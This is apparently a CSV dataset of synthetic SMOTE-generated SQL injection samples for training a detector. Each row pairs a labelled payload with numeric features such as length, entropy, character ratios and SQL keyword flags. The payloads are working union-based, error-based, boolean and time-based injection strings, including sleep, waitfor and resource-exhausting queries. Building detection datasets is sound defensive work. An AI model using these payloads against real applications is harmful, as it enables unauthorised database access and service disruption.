id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000467,attack,boolean,"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",nearest_attack_euclidean,R008872,0.19213766464986154,81.83534338049813,25.713074632249896,3.474122741758239,19.139223896749687,14.852298528999583,35.704597057999166,12.139223896749687,0.2346169600878328,0.18104022620939425,0.43620804524187884,0.1481347684608941,0.0,4.0,1.0,0.0,0.0,1.0,0.0,5.4261492644997915,0.0,0.0,0.713074632249896,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000468,attack,error,"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R006533,0.4295980747942681,214.36745398378588,39.22790899729765,3.7845013213455014,63.0,37.0,89.91163598919059,24.455817994595286,0.2939278066975688,0.17262426742555625,0.4193940673814104,0.11405385849546457,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.227908997297643,0.2279089972976439,0.0,3.0,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,1.0,1.0,6.0
SMOTE_000469,attack,boolean,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R007778,0.005816843972512325,79.0,25.0,3.4940336273949755,13.0,24.0,32.0,10.0,0.16455696202531647,0.3037974683544304,0.4050632911392405,0.12658227848101267,0.0,0.0,3.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000470,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R005131,0.06878636190381851,78.11466078496034,24.873522969280046,3.596148047986838,13.0,24.0,31.24113781568028,9.873522969280046,0.16658041663071654,0.3075330768567075,0.39950434991561384,0.12638215659696211,0.0,0.0,3.0,0.0,1.0,2.0,0.0,3.873522969280047,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000471,attack,union,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",nearest_attack_euclidean,R001752,0.27542182892843714,75.55989308270847,25.0,3.950745819424041,19.0,34.04791446616678,14.0,8.511978616541695,0.25173200411460117,0.4502250048091858,0.18548673987391665,0.11255625120229644,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.511978616541694,2.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000472,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R008306,0.6246370833935526,370.97049908222897,41.535300061184735,3.6845356187675895,116.85879975526105,35.0,162.64699938815264,56.46469993881526,0.3150279488855772,0.09438540210010428,0.43834388444355726,0.15224276457076122,0.0,4.0,0.0,0.0,0.0,1.535300061184736,0.0,34.92939987763052,0.0,2.0,4.0,11.535300061184735,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000473,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R002768,0.19162666818895635,142.8079102918076,38.0,4.395859211153352,63.44926564668921,18.0,41.02169541010146,20.33694923501691,0.4450648849416715,0.12638344652586422,0.2860835002611995,0.14246816827126474,4.0,4.0,1.0,0.0,0.0,1.8876835883276968,0.0,4.449265646689213,0.0,0.0,0.0,6.887683588327697,1.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000474,attack,union,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,nearest_attack_euclidean,R002414,0.2179108925563503,69.64605815753393,28.0,4.197247384981067,29.0,17.316846526027142,15.0,8.329211631506785,0.41685421302004755,0.24802752482862667,0.21561424811381769,0.11950401403750804,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.32921163150678545,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000475,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",nearest_attack_euclidean,R006691,0.10192046953920511,99.70646865005321,26.34129373001064,3.815822724533145,39.36517492004256,14.0,33.34129373001064,13.0,0.3945850340263671,0.14049033474333814,0.33446932039719507,0.1304553108330997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000476,attack,boolean,1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R008509,0.06991713531798176,149.0457291950867,35.0,4.249393190018093,62.53429689631502,23.0,44.51143229877167,19.0,0.419383696700691,0.15439949189612404,0.298669405054213,0.12754740634897202,4.999999999999999,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,8.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000477,attack,boolean,-1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh,nearest_attack_euclidean,R003666,0.3118108957427922,373.7472646885792,38.67755959706787,3.676425769679758,104.35511919413574,48.0,158.3267879120362,63.06535758240723,0.27974519993326474,0.12873065403302514,0.42276070265592186,0.16876344337778829,4.0,0.0,1.0,0.0,0.0,2.0,0.0,32.06535758240724,0.0,3.0,0.0,23.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000478,attack,boolean,"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R003556,0.4447513412604647,117.91083286968615,30.0,3.734912860457503,41.221313299993945,11.905861621213038,46.25186421817742,18.531793730301747,0.34235014976364897,0.10739109424630947,0.39175967452099286,0.15849908146904873,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.8753107030295695,2.0,0.7811723242426076,1.2188276757573924,3.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000479,attack,boolean,"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002053,1.18838187036968,173.2285034566306,33.19287413584235,4.181666889557689,85.0,18.0,45.42137759247295,24.807125864157648,0.49093117006564435,0.10396189483743057,0.26195666034650644,0.14315027475041858,3.4035629320788248,0.0,1.192874135842351,0.0,1.0,2.0,0.0,5.403562932078824,0.0,5.0,4.0,7.0,1.0,0.0,0.5964370679211756,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000480,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008983,0.23354426933866831,58.44122473434009,15.0,3.1075703788728326,43.952979787472074,1.0,4.0,9.488244946868019,0.7520010038806066,0.01714249861406905,0.06856999445627626,0.16228650304904807,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.488244946868018,2.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000481,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000127,0.6776416594197798,42.85402569650461,16.284675232168205,3.0730848098191474,13.0,0.0,18.569350464336406,11.284675232168205,0.303649558701291,0.0,0.43309008305028895,0.26326035824842003,0.0,0.2846752321682043,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.2846752321682042,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000482,attack,boolean,"1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R005503,2.4374437492554574e-05,281.99937369946633,36.9999614584287,3.558762142322768,74.99981692753633,27.0,127.9996916674296,51.99986510450046,0.26595737075702297,0.09574495718721455,0.45390059837048485,0.18439707368527755,4.0,0.0,0.0,0.0,0.0,2.0,0.0,27.9999229168574,2.0,1.9999903646071753,3.999990364607175,11.9999614584287,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.999980729214351,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.99998072921435
SMOTE_000483,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'yaml'  =  'yaml",nearest_attack_euclidean,R004554,0.14037436973068884,188.3235918869041,33.0,3.794559378346721,68.0,16.0,73.97236978921515,30.35122209768896,0.36160701641936077,0.085084003863379,0.3921660245308837,0.16114295518637659,3.0,0.0,0.0,0.0,0.0,1.0,0.0,16.35122209768896,0.0,2.0,4.0,5.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000484,attack,union,"1   )    )    union all select null,null--",nearest_attack_euclidean,R008457,0.18515986955399277,43.5277019411908,15.0,3.214040010572601,23.22216155295264,1.0,14.0,5.30554038823816,0.5327869009715367,0.02303561198521234,0.32249856779297303,0.12167891925027796,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.0,1.3055403882381604,2.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000485,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003533,0.7640321253703283,108.97814859473092,30.795629718946184,3.944691072174262,37.18251887578474,18.0,38.79562971894619,15.0,0.34028218879805766,0.16549841203269927,0.35630405580866037,0.1379153433605827,3.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,6.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,1.397814859473092,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.397814859473092
SMOTE_000486,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R008555,0.19982554135425068,58.950867818372274,18.0,2.9078848840550564,10.0,10.0,30.54777349748305,8.403094320889224,0.1731520535802414,0.17315205358024144,0.5118557153202713,0.14184017751924585,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.403094320889225,0.0,0.0,1.0,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000487,attack,union,"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",nearest_attack_euclidean,R000981,0.05503774180454151,80.14210505859018,21.0,3.516080778307985,14.0,35.65684202343607,17.656842023436067,12.828421011718035,0.17492793065201487,0.4449814678819467,0.22007412847221325,0.16001647299382515,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.9142105058590166,0.0,0.0,6.914210505859017,0.9999999999999996,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000488,attack,boolean,1  )   and 2457  =  8146,nearest_attack_euclidean,R003026,0.49837607347736523,30.092062276164867,14.405860525268814,3.1471124899819,4.405860525268821,10.87448070035842,11.874480700358419,2.937240350179211,0.14241493893914073,0.3639177661296377,0.3987240023051278,0.09494329262609383,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.4686201750896055,0.0,0.0,0.4686201750896051,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000489,attack,other,1'+  (  select 'cwta' where 6091  =  6091,nearest_attack_euclidean,R000931,0.0,41.0,18.0,3.709661204390347,15.0,9.0,11.0,6.0,0.36585365853658536,0.21951219512195122,0.2682926829268293,0.14634146341463414,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000490,attack,error,"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002470,0.0712977428384176,293.49585589338506,36.0,3.824052885580211,100.0,35.0,117.99658720631712,40.49926868706795,0.3416330731770966,0.11957157561198381,0.4009092041815093,0.13788614702941027,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.499268687067953,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,10.0
SMOTE_000491,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,0.0,34.0,18.0,3.528064311584049,11.0,9.0,12.0,2.0,0.3235294117647059,0.2647058823529412,0.35294117647058826,0.058823529411764705,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000492,attack,boolean,"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001742,0.04654319891292796,150.5870531188611,35.12208100914316,4.3533299436434705,76.73248605485898,17.0,39.73248605485897,17.122081009143162,0.5095916971224022,0.11297622408564759,0.26370226823011034,0.11372981056183994,1.0,0.0,2.0,0.0,1.0,2.0,0.0,4.1220810091431614,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000493,attack,time,1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R008975,0.22744078297686338,93.13820276421862,20.0,2.8230277942714066,27.0,2.0,49.781835636848854,14.35636712736977,0.2909967890074102,0.02155531770425262,0.5333551619491512,0.154092731339186,1.0,0.0,0.0,0.0,1.0,0.0,0.0,10.35636712736977,0.9999999999999999,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000494,attack,other,1'  )   as mwpp where 6192  =  6192,nearest_attack_euclidean,R002861,8.429369702178807e-08,35.0,16.0,3.4214419452073277,11.0,9.0,12.0,3.0,0.3142857142857143,0.2571428571428571,0.34285714285714286,0.08571428571428572,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000495,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000567,7.125097582596972,63.07187709630815,26.445112448244632,4.011219253841288,29.203607220521025,2.489022489648926,18.35729236543605,13.021955020702148,0.4391590044255188,0.04090176214456093,0.2866534334401666,0.23328579998975368,2.0,1.0,2.0,0.0,0.4890224896489268,0.4890224896489268,1.0,1.9999999999999991,0.0,2.043910041404293,0.48902248964892703,2.9780449792978536,1.0,1.0,1.0,0.4890224896489268,2.168404344971009e-19,0.48902248964892675,1.0,0.9999999999999999,0.0,-1.3877787807814457e-17,0.0,0.9780449792978537,0.4890224896489268,0.4890224896489268,0.4890224896489268,0.0,0.4890224896489268,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5109775103510732,0.5109775103510732,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9560899585957072
